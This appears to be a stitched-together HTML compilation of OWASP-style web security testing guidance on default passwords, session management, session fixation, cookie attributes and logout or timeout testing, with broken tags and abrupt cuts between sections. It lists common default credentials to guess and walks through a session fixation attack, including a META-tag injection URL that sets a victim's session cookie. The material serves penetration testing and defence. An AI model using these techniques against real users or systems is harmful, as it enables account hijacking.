      <p>Once the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:</p>
      <ul>
      <li>Searching for &ldquo;[SOFTWARE] default password&rdquo;.</li>
      <li>Reviewing the manual or vendor documentation.</li>
      <li>Checking common default password databases, such as <a href="https://cirt.net/passwords">CIRT.net</a>, <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials">SecLists Default Passwords</a> or <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv">DefaultCreds-cheat-sheet</a>.</li>
      <li>Inspecting the application source code (if available).</li>
      <li>Installing the application on a virtual machine and inspecting it.</li>
      <li>Inspecting the physical hardware for stickers (often present on network devices).</li>
      </ul>
      <p>If a default password can&rsquo;t be found, try common options such as:</p>
      <ul>
      <li>&ldquo;admin&rdquo;, &ldquo;password&rdquo;, &ldquo;12345&rdquo;, or other <a href="https://github.com/nixawk/fuzzdb/blob/master/bruteforce/passwds/default_devices_users%2Bpasswords.txt">common default passwords</a>.</li>
      <li>An empty or blank password.</li>
      <li>The serial number or MAC address of the device.</li>
      </ul>
      <p>If the username is unknown, there are various options for enumerating users, discussed in the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">Testing for Account Enumeration</a> guide. Alternatively, try common options such as &ldquo;admin&rdquo;, &ldquo;root&rdquo;, or &ldquo;system&rdquo;.</p>
      <h3 id="testing-for-organization-default-passwords">Testing for Organization Default Passwords</h3>
      <p>When staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:</p>
      <ul>
      <li>A single common password such as &ldquo;Password1&rdquo;.</li>
      <li>Organization specific details, such as the organization name or address.</li>
      <li>Passwords that follow a simple pattern, such as &ldquo;Monday123&rdquo; if account is created on a Monday.</li>
      </ul>
      <p>These types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing grey-box or white-box testing.</p>
      <h3 id="testing-for-application-generated-default-passwords">Testing for Application Generated Default Passwords</h3>
      <p>If the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.</p>
      <p>The passwords may be based on:</p>
      <ul>
      <li>A single static string shared between accounts.</li>
      <li>A hashed or obfuscated part of the account details, such as <code class="language-plaintext highlighter-rouge">md5($username)</code>.</li>
      <li>A time-based algorithm.</li>
      <li>A weak pseudo-random number generator (PRNG).</li>
      </ul>
      <p>This type of issue of often difficult to identify from a black-box perspective.</p>

        <h4>Credentials are the most widely used authentication technology. Due to such a wide usage of username-password pairs, users are no longer able to properly handle their credentials across the multitude of used applications.</h4>
        <p>In order to assist users with their credentials, multiple technologies surfaced:</p>
        <ul>
        <li>Applications provide a <em>remember me</em> functionality that allows the user to stay authenticated for long periods of time, without asking the user again for their credentials.</li>
        <li>Password Managers - including browser password managers - that allow the user to store their credentials in a secure manner and later on inject them in user-forms without any user intervention.</li>

        <ul>

        <p>As these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area. Some applications:</p>
        <ul>
        <li>Store the credentials in an encoded fashion in the browser&rsquo;s storage mechanisms, which can be verified by following the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage">web storage testing scenario</a> and going through the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema#session-analysis">session analysis</a> scenarios.

	  <h4>Consistent authentication refers to the practice of ensuring that users are authenticated in a secure, reliable, and uniform manner across all systems, devices, and sessions. This involves managing the user’s identity securely and ensuring that authentication processes are repeatable, seamless, and resistant to common security threats. Consistency in authentication helps to protect sensitive data and user privacy, while offering a smooth user experience.</h4>

    <h2>Why is Consistent Authentication Important?</h2>
    <p>Authentication is the foundation of security for web applications. Without proper authentication, attackers can gain unauthorized access to sensitive information and systems. Inconsistent authentication practices can create vulnerabilities, such as:</p>
    <ul>
        <li><strong>Weak or Reused Passwords:</strong> Users may be asked to enter passwords in an inconsistent manner, which could lead to weak or reused passwords.</li>
        <li><strong>Multiple Session Handling:</strong> If authentication is not consistent across devices or sessions, attackers may exploit inconsistencies to hijack or bypass sessions.</li>
        <li><strong>Insecure Token Management:</strong> Failure to consistently manage session tokens or authentication credentials can result in session fixation or impersonation attacks.</li>
    </ul>

    <h2>Key Principles of Consistent Authentication</h2>
    <p>Consistent authentication requires adherence to several key principles:</p>
    <ul>
        <li><strong>Single Source of Truth:</strong> Authentication data (e.g., credentials, tokens) should be securely stored and managed in one central location, such as an identity provider (IdP), to ensure uniform access controls.</li>
        <li><strong>Multi-Device Support:</strong> The authentication process should be seamless across multiple devices, ensuring that users can securely log in from any device while maintaining the same access controls.</li>
        <li><strong>Session Consistency:</strong> Once authenticated, users should have consistent access to their sessions without needing to repeatedly log in across different parts of an application.</li>
        <li><strong>Secure Token Management:</strong> Authentication tokens should be stored and transmitted securely, using HTTPS for transmission and proper expiration management to avoid session hijacking.</li>
        <li><strong>Principle of Least Privilege:</strong> Consistently authenticate users with only the minimum required privileges for their role, reducing the risk of unauthorized access to sensitive resources.</li>
    </ul>

    <h2>Methods of Achieving Consistent Authentication</h2>
    <p>Several techniques and technologies can be used to achieve consistent authentication across an application:</p>
    <ul>
        <li><strong>Single Sign-On (SSO):</strong> SSO allows users to authenticate once and access multiple applications or services without needing to log in again. This eliminates the need for multiple usernames and passwords and ensures a consistent authentication experience across applications.</li>
        <li><strong>OAuth 2.0 and OpenID Connect:</strong> These modern protocols enable consistent authentication across different services by delegating authentication to an identity provider. Users authenticate once with a trusted provider (e.g., Google, Facebook), and the application receives an access token to grant access to resources.</li>
        <li><strong>Two-Factor Authentication (2FA):</strong> Consistently using 2FA (e.g., a password plus a one-time code sent via SMS or an authenticator app) helps to ensure that authentication is more secure and harder to compromise, even if an attacker gains access to a password.</li>
        <li><strong>Session Management:</strong> Ensure that sessions are managed properly, using secure, short-lived tokens or cookies with appropriate expiration times and automatic logout features after periods of inactivity.</li>
        <li><strong>Authentication as a Service (IDaaS):</strong> Identity and Access Management (IAM) platforms such as AWS Cognito, Okta, or Auth0 provide consistent authentication services across multiple platforms and services.</li>
    </ul>

    <h2>Best Practices for Consistent Authentication</h2>
    <p>To ensure authentication is secure and consistent across all systems and devices, follow these best practices:</p>
    <ul>
        <li><strong>Use Strong Password Policies:</strong> Enforce strong passwords (e.g., minimum length, complexity requirements) and encourage users to regularly change passwords to mitigate the risks of password-based attacks.</li>
        <li><strong>Implement Multi-Factor Authentication (MFA):</strong> Always implement MFA for critical systems and sensitive actions to add an extra layer of security.</li>
        <li><strong>Secure Storage of Credentials:</strong> Store user credentials securely using encryption or hashing techniques, such as bcrypt or Argon2, to prevent attackers from easily accessing user passwords.</li>
        <li><strong>Use HTTPS for All Authentication Transactions:</strong> Ensure that all authentication exchanges are done over HTTPS to prevent man-in-the-middle attacks and ensure the integrity of the authentication process.</li>
        <li><strong>Enforce Session Timeout and Re-authentication:</strong> Automatically log users out after a certain period of inactivity, and prompt for re-authentication after sensitive actions (e.g., changing password or accessing personal data).</li>
        <li><strong>Audit and Monitor Authentication Events:</strong> Continuously monitor authentication logs for unusual or suspicious activity. Set up alerts for failed login attempts, session anomalies, and other signs of potential attacks.</li>
    </ul>

    <h2>Challenges in Maintaining Consistent Authentication</h2>
    <p>While maintaining consistent authentication is essential, it can come with challenges:</p>
    <ul>
        <li><strong>Handling Different Authentication Methods:</strong> Different applications or platforms may require different authentication methods, such as basic authentication, OAuth, or SSO. Ensuring consistency across these can be complex.</li>
        <li><strong>Legacy Systems:</strong> Older systems may not support modern authentication protocols (e.g., OAuth, OpenID Connect), requiring additional effort to integrate them into a consistent authentication scheme.</li>
        <li><strong>Scaling Authentication for Large Applications:</strong> As applications scale and users grow, managing authentication across multiple systems and ensuring that tokens or sessions remain consistent can become more challenging.</li>
        <li><strong>User Experience:</strong> While strong authentication mechanisms (e.g., MFA) improve security, they may add friction to the user experience. Balancing security and ease of use is key to user adoption.</li>
    </ul>

      <h1>Session Management Analysis</h1></br>

  <h4>Session management is a crucial aspect of web application security, as it is responsible for maintaining the state of a user's session within the application. Here are the steps you can follow to analyze the session management implementation in an application:</>

  <ol>
      <li>
          <h4>Review the application's source code:</h4>
          <p>Manually reviewing the application's source code can provide valuable insights into how session management is being handled. Look for functions or classes that are responsible for generating and managing session tokens. Pay close attention to how these tokens are being generated, stored, and transmitted between the client and server.</p>
      </li>

      <li>
          <h4>Analyze cookies and URL parameters:</h4>
          <p>In many web applications, session tokens are typically stored in cookies or passed as URL parameters. Use browser developer tools or a network analyzer like Wireshark to inspect the cookies and URL parameters that are being used by the application. Look for session tokens and analyze their format, length, and structure.</p>
      </li>

      <li>
          <h2>Manipulate session tokens:</h2>
          <p>To test the robustness of the session management implementation, try manipulating the session tokens. For example, change the value of a session token stored in a cookie or passed as a URL parameter and observe how the application responds. This can help you identify potential vulnerabilities, such as session fixation or session hijacking.</p>
      </li>

      <li>
          <h2>Perform session timeout tests:</h2>
          <p>A robust session management implementation should include a configurable session timeout mechanism. This ensures that a user's session is automatically terminated after a specified period of inactivity. To test this, log into the application and then leave the session idle for a period of time. After the specified timeout period has elapsed, attempt to perform an action within the application. If you are still able to perform actions within the application, this indicates that the session timeout mechanism is not functioning as expected.</p>
      </li>

      <li>
          <h2>Check for HTTP-only and secure flags:</h2>
          <p>To help mitigate the risk of session cookies being stolen or intercepted by an attacker, ensure that session cookies are being set with the "HTTP-only" and "secure" flags. The "HTTP-only" flag prevents client-side scripts from accessing the session cookie, while the "secure" flag ensures that the session cookie is only transmitted over HTTPS connections.</p>
      </li>

      <li>
          <h2>Use automated tools:</h2>
          <p>There are several automated tools available that can help you analyze the session management implementation in an application. Some popular options include:</p>
          <ul>
              <li>OWASP Zed Attack Proxy (ZAP)</li>
              <li>Burp Suite</li>
              <li>Acunetix Web Vulnerability Scanner</li>
          </ul>
          <p>These tools can automate the process of analyzing the session management implementation by systematically probing the target application for vulnerabilities related to session management.</p>

        <h4>Session Fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the vulnerable web application. When authenticating a user, it doesn&rsquo;t assign a new session ID, making it possible to use an existent session ID. The attack consists of obtaining a valid session ID (e.g. by connecting to the application), inducing a user to authenticate himself with that session ID, and then hijacking the user-validated session by the knowledge of the used session ID. The attacker has to provide a legitimate Web application session ID and try to make the victim&rsquo;s browser use it.</h4>
        <p>The session fixation attack is not a class of <a href="https://owasp.org/www-community/attacks/Session_hijacking_attack">Session Hijacking</a>, which steals the established session between the client and the Web Server after the user logs in. Instead, the Session Fixation attack fixes an established session on the victim&rsquo;s browser, so the attack starts before the user logs in.</p>
        <p>There are several techniques to execute the attack; it depends on how the Web application deals with session tokens. Below are some of the most common techniques:</p>
        <ul>
        <li>
        <p><strong>Session token in the URL argument:</strong> The Session ID is sent to the victim in a hyperlink and the victim accesses the site through the malicious URL.</p>
        </li>
        <li>
        <p><strong>Session token in a hidden form field:</strong> In this method, the victim must be tricked to authenticate in the target Web Server, using a login form developed for the attacker. The form could be hosted in the evil web server or directly in html formatted e-mail.</p>
        </li>
        <li>
        <p><strong>Session ID in a cookie:</strong></p>
        <ul>
        <li>
        <p>Client-side script</p>
        <p>Most browsers support the execution of client-side scripting. In this case, the aggressor could use attacks of code injection as the <a title="wikilink" href="https://owasp.org/www-community/attacks/Cross-site_Scripting_/(XSS/)">XSS</a> (Cross-site scripting) attack to insert a malicious code in the hyperlink sent to the victim and fix a Session ID in its cookie. Using the function document.cookie, the browser which executes the command becomes capable of fixing values inside of the cookie that it will use to keep a session between the client and the Web Application.</p>
        </li>
        <li>
        <p>META Tag</p>
        <p>Is considered a code injection attack, however, different from the XSS attack where undesirable scripts can be disabled, or the execution can be denied. The attack using this method becomes much more efficient because it&rsquo;s impossible to disable the processing of these tags in the browsers.</p>
        </li>
        <li>
        <p>HTTP header response-</p>
        <p>This method explores the server response to fix the Session ID in the victim&rsquo;s browser. Including the parameter Set-Cookie in the HTTP header response, the attacker is able to insert the value of Session ID in the cookie and sends it to the victim&rsquo;s browser.</p>
        </li>
        </ul>
        </li>
        </ul>
        <h2 id="examples">Examples</h2>
        <h3 id="example-1">Example 1</h3>
        <p>The example below explains a simple form, the process of the attack, and the expected results.</p>
        <ol>
        <li>The attacker has to establish a legitimate connection with the web server which</li>
        <li>issues a session ID or, the attacker can create a new session with the proposed session ID, then</li>
        <li>the attacker has to send a link with the established session ID to the victim, they have to click on the link sent from the attacker accessing the site</li>
        <li>the Web Server saw that session was already established and a new one need not to be created</li>
        <li>the victim provides their credentials to the Web Server</li>
        <li>knowing the session ID, the attacker can access the user&rsquo;s account.</li>
        </ol>

        <p>Figure 1. Simple example of Session Fixation attack.</p>
        <h3 id="example-2">Example 2</h3>
        <p>Client-side scripting</p>
        <p>The processes for the attack using the execution of scripts in the victim&rsquo;s browser are very similar to example 1, however, in this case, the Session ID does not appear as an argument of the URL, but inside of the cookie. To fix the value of the Session ID in the victim&rsquo;s cookie, the attacker could insert a JavaScript code in the URL that will be executed in the victim&rsquo;s browser.</p>
        <p>` http://website.kom/`</p>
        <h3 id="example-3">Example 3</h3>
        <p>META Tag</p>
        <p>As well as client-side scripting, the code injection must be made in the URL that will be sent to the victim.</p>
        <p><code class="language-plaintext highlighter-rouge">http://website.kon/&lt;meta http-equiv=Set-Cookie content=&rdquo;sessionid=abcd&rdquo;&gt;</code></p>
        <h3 id="example-4">Example 4</h3>
        <p>HTTP header response</p>
        <p>The insertion of the value of the SessionID into the cookie manipulating the server response can be made, intercepting the packages exchanged between the client and the Web Application inserting the Set-Cookie parameter.</p>

    <h4>Web Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.</h4>
    <p>HTTP is a stateless protocol, meaning that it doesn&rsquo;t hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage">testing browser storage</a>, contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.</p>
    <p>The most used session storage mechanism in browsers is cookie storage. Cookies can be set by the server, by including a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie"><code class="language-plaintext highlighter-rouge">Set-Cookie</code></a> header in the HTTP response or via JavaScript. Cookies can be used for a multitude of reasons, such as:</p>
    <ul>
    <li>session management</li>
    <li>personalization</li>
    <li>tracking</li>
    </ul>
    <p>In order to secure cookie data, the industry has developed means to help lock down these cookies and limit their attack surface. Over time cookies have become a preferred storage mechanism for web applications, as they allow great flexibility in use and protection.</p>
    <p>The means to protect the cookies are:</p>
    <ul>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Creating_cookies">Cookie Attributes</a></li>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes">Cookie Prefixes</a></li>
    </ul>
    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Ensure that the proper security configuration is set for cookies.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <p>Below, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#intercepting-proxy">intercepting proxy</a>, or by reviewing the browser&rsquo;s cookie jar.</p>
    <h3 id="cookie-attributes">Cookie Attributes</h3>
    <h4 id="secure-attribute">Secure Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure"><code class="language-plaintext highlighter-rouge">Secure</code></a> attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as <code class="language-plaintext highlighter-rouge">HTTPS</code>. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both <code class="language-plaintext highlighter-rouge">HTTP</code> and <code class="language-plaintext highlighter-rouge">HTTPS</code>, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.</p>
    <h4 id="httponly-attribute">HttpOnly Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly"><code class="language-plaintext highlighter-rouge">HttpOnly</code></a> attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.</p>
    <blockquote>
    <p>This doesn&rsquo;t limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.</p>
    </blockquote>
    <h4 id="domain-attribute">Domain Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies"><code class="language-plaintext highlighter-rouge">Domain</code></a> attribute is used to compare the cookie&rsquo;s domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#path-attribute"><code class="language-plaintext highlighter-rouge">path</code></a> attribute will be checked next.</p>
    <p>Note that only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the <code class="language-plaintext highlighter-rouge">domain</code> attribute cannot be a top level domain (such as <code class="language-plaintext highlighter-rouge">.gov</code> or <code class="language-plaintext highlighter-rouge">.com</code>) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for <code class="language-plaintext highlighter-rouge">owasp.org</code>). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the <code class="language-plaintext highlighter-rouge">domain</code>.</p>
    <p>For example, if a cookie is set by an application at <code class="language-plaintext highlighter-rouge">app.mydomain.com</code> with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for <code class="language-plaintext highlighter-rouge">app.mydomain.com</code>, but not its subdomains (such as <code class="language-plaintext highlighter-rouge">hacker.app.mydomain.com</code>), or to <code class="language-plaintext highlighter-rouge">otherapp.mydomain.com</code>. (However, older versions of Edge/IE behave differently, and <em>do</em> send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the <code class="language-plaintext highlighter-rouge">domain</code> attribute to <code class="language-plaintext highlighter-rouge">mydomain.com</code>. In this case the cookie would be sent to all requests for <code class="language-plaintext highlighter-rouge">app.mydomain.com</code> and <code class="language-plaintext highlighter-rouge">mydomain.com</code> subdomains, such as <code class="language-plaintext highlighter-rouge">hacker.app.mydomain.com</code>, and even <code class="language-plaintext highlighter-rouge">bank.mydomain.com</code>. If there was a vulnerable server on a subdomain (for example, <code class="language-plaintext highlighter-rouge">otherapp.mydomain.com</code>) and the <code class="language-plaintext highlighter-rouge">domain</code> attribute has been set too loosely (for example, <code class="language-plaintext highlighter-rouge">mydomain.com</code>), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of <code class="language-plaintext highlighter-rouge">mydomain.com</code>.</p>
    <h4 id="path-attribute">Path Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies"><code class="language-plaintext highlighter-rouge">Path</code></a> attribute plays a major role in setting the scope of the cookies in conjunction with the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#domain-attribute"><code class="language-plaintext highlighter-rouge">domain</code></a>. In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root <code class="language-plaintext highlighter-rouge">/</code>, then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">path=/bank</code></li>
    <li><code class="language-plaintext highlighter-rouge">path=/private</code></li>
    <li><code class="language-plaintext highlighter-rouge">path=/docs</code></li>
    <li><code class="language-plaintext highlighter-rouge">path=/docs/admin</code></li>
    </ul>
    <h4 id="expires-attribute">Expires Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Permanent_cookies"><code class="language-plaintext highlighter-rouge">Expires</code></a> attribute is used to:</p>
    <ul>
    <li>set persistent cookies</li>
    <li>limit lifespan if a session lives for too long</li>
    <li>remove a cookie forcefully by setting it to a past date</li>
    </ul>
    <p>Unlike <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Session_cookies">session cookies</a>, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.</p>
    <h4 id="samesite-attribute">SameSite Attribute</h4>
    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies"><code class="language-plaintext highlighter-rouge">SameSite</code></a> attribute can be used to assert whether a cookie should be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-origin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">cross-site request forgery</a> attacks. This attribute can be configured in three different modes:</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">Strict</code></li>
    <li><code class="language-plaintext highlighter-rouge">Lax</code></li>
    <li><code class="language-plaintext highlighter-rouge">None</code></li>
    </ul>
    <h5 id="strict-value">Strict Value</h5>
    <p>The <code class="language-plaintext highlighter-rouge">Strict</code> value is the most restrictive usage of <code class="language-plaintext highlighter-rouge">SameSite</code>, allowing the browser to send the cookie only to first-party context without top-level navigation. In other words, the data associated with the cookie will only be sent on requests matching the current site shown on the browser URL bar. The cookie will not be sent on requests generated by third-party sites. This value is especially recommended for actions performed at the same domain. However, it can have some limitations with some session management systems negatively affecting the user navigation experience. Since the browser would not send the cookie on any requests generated from a third-party domain or email, the user would be required to sign in again even if they already have an authenticated session.</p>
    <h5 id="lax-value">Lax Value</h5>
    <p>The <code class="language-plaintext highlighter-rouge">Lax</code> value is less restrictive than <code class="language-plaintext highlighter-rouge">Strict</code>. The cookie will be sent if the URL equals the cookie&rsquo;s domain (first-party) even if the link is coming from a third-party domain. This value is considered by most browsers the default behavior since it provides a better user experience than the <code class="language-plaintext highlighter-rouge">Strict</code> value. It doesn&rsquo;t trigger for assets, such as images, where cookies might not be needed to access them.</p>
    <h5 id="none-value">None Value</h5>
    <p>The <code class="language-plaintext highlighter-rouge">None</code> value specifies that the browser will send the cookie in all contexts, including cross-site requests (the normal behavior before the implementation of <code class="language-plaintext highlighter-rouge">SameSite</code>). If <code class="language-plaintext highlighter-rouge">Samesite=None</code> is set, then the Secure attribute must be set, otherwise modern browsers will ignore the SameSite attribute, <em>e.g.</em> <code class="language-plaintext highlighter-rouge">SameSite=None; Secure</code>.</p>
    <h3 id="cookie-prefixes">Cookie Prefixes</h3>
    <p>By design cookies do not have the capabilities to guarantee the integrity and confidentiality of the information stored in them. Those limitations make it impossible for a server to have confidence about how a given cookie&rsquo;s attributes were set at creation.

    <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes"><code class="language-plaintext highlighter-rouge">__Secure-</code></a> prefix is less restrictive and can be introduced by adding the case-sensitive string <code class="language-plaintext highlighter-rouge">__Secure-</code> to the cookie name. Any cookie that matches the prefix <code class="language-plaintext highlighter-rouge">__Secure-</code> would be expected to fulfill the following conditions:</p>
    <ol>
    <li>The cookie must be set with the <code class="language-plaintext highlighter-rouge">Secure</code> attribute.</li>
    <li>The cookie must be set from a URI considered secure by the user agent.</li>

        <h1 id="testing-session-timeout">Testing Session Timeout</h1></br>
    
    <h4>In this phase testers check that the application automatically logs out a user when that user has been idle for a certain amount of time, ensuring that it is not possible to &ldquo;reuse&rdquo; the same session and that no sensitive data remains stored in the browser cache.</h4>
    <p>All applications should implement an idle or inactivity timeout for sessions. This timeout defines the amount of time a session will remain active in case there is no activity by the user, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The most appropriate timeout should be a balance between security (shorter timeout) and usability (longer timeout) and heavily depends on the sensitivity level of the data handled by the application. For example, a 60 minute log out time for a public forum can be acceptable, but such a long time would be too much in a home banking application (where a maximum timeout of 15 minutes is recommended). In any case, any application that does not enforce a timeout-based log out should be considered not secure, unless such behavior is required by a specific functional requirement.</p>
    <p>The idle timeout limits the chances that an attacker has to guess and use a valid session ID from another user, and under certain circumstances could protect public computers from session reuse. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker&rsquo;s actions, as he can generate activity on the session periodically to keep the session active for longer periods of time.</p>
    <p>Session timeout management and expiration must be enforced server-side. If some data under the control of the client is used to enforce the session timeout, for example using cookie values or other client parameters to track time references (e.g. number of minutes since log in time), an attacker could manipulate these to extend the session duration. So the application has to track the inactivity time server-side and, after the timeout is expired, automatically invalidate the current user&rsquo;s session and delete every data stored on the client.</p>
    <p>Both actions must be implemented carefully, in order to avoid introducing weaknesses that could be exploited by an attacker to gain unauthorized access if the user forgot to log out from the application. More specifically, as for the log out function, it is important to ensure that all session tokens (e.g. cookies) are properly destroyed or made unusable, and that proper controls are enforced server-side to prevent the reuse of session tokens. If such actions are not properly carried out, an attacker could replay these session tokens in order to &ldquo;resurrect&rdquo; the session of a legitimate user and impersonate him/her (this attack is usually known as &lsquo;cookie replay&rsquo;). Of course, a mitigating factor is that the attacker needs to be able to access those tokens (which are stored on the victim&rsquo;s PC), but, in a variety of cases, this may not be impossible or particularly difficult.</p>
    <p>The most common scenario for this kind of attack is a public computer that is used to access some private information (e.g., web mail, online bank account). If the user moves away from the computer without explicitly logging out and the session timeout is not implemented on the application, then an attacker could access to the same account by simply pressing the &ldquo;back&rdquo; button of the browser.</p>

    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <h3 id="black-box-testing">Black-Box Testing</h3>
    <p>The same approach seen in the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality">Testing for logout functionality</a> section can be applied when measuring the timeout log out. The testing methodology is very similar. First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered. As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.</p>
    <p>Then, if the timeout is configured, testers need to understand whether the timeout is enforced by the client or by the server (or both). If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server. If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it&rsquo;s possible that the client is involved in the timeout enforcing. In this case, testers could try to modify the cookie (if it&rsquo;s not cryptographically protected) and see what happens to the session. For instance, testers can set the cookie expiration date far in the future and see whether the session can be prolonged.</p>
    <p>As a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.</p>
    <h3 id="gray-box-testing">Gray-Box Testing</h3>
    <p>The tester needs to check that:</p>
    <ul>
    <li>The log out function effectively destroys all session token, or at least renders them unusable,</li>
    <li>The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers</li>
    <li>A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.</li>
    </ul>
    <p>Note that the most important thing is for the application to invalidate the session on the server-side. Generally this means that the code must invoke the appropriate methods, e.g. <code class="language-plaintext highlighter-rouge">HttpSession.invalidate()</code> in Java and <code class="language-plaintext highlighter-rouge">Session.abandon()</code> in .NET. Clearing the cookies from the browser is advisable, but is not strictly necessary, since if the session is properly invalidated on the server, having the cookie in the browser will not help an attacker.</p>

        <h1 id="testing-for-logout-functionality">Testing for Logout Functionality</h1></br>
     
      <h4>Session termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.</h4>
      <p>A secure session termination requires at least the following components:</p>
      <ul>
      <li>Availability of user interface controls that allow the user to manually log out.</li>
      <li>Session termination after a given amount of time without activity (session timeout).</li>
      <li>Proper invalidation of server-side session state.</li>
      </ul>
      <p>There are multiple issues which can prevent the effective termination of a session. For the ideal secure web application, a user should be able to terminate at any time through the user interface. Every page should contain a log out button on a place where it is directly visible. Unclear or ambiguous log out functions could cause the user not trusting such functionality.</p>
      <p>Another common mistake in session termination is that the client-side session token is set to a new value while the server-side state remains active and can be reused by setting the session cookie back to the previous value. Sometimes only a confirmation message is shown to the user without performing any further action. This should be avoided.</p>
      <p>Some web application frameworks rely solely on the session cookie to identify the logged-on user. The user&rsquo;s ID is embedded in the (encrypted) cookie value. The application server does not do any tracking on the server-side of the session. When logging out, the session cookie is removed from the browser. However, since the application does not do any tracking, it does not know whether a session is logged out or not. So by reusing a session cookie it is possible to gain access to the authenticated session. A well-known example of this is the Forms Authentication functionality in ASP.NET.</p>
      <p>Users of web browsers often don&rsquo;t mind that an application is still open and just close the browser or a tab. A web application should be aware of this behavior and terminate the session automatically on the server-side after a defined amount of time.</p>
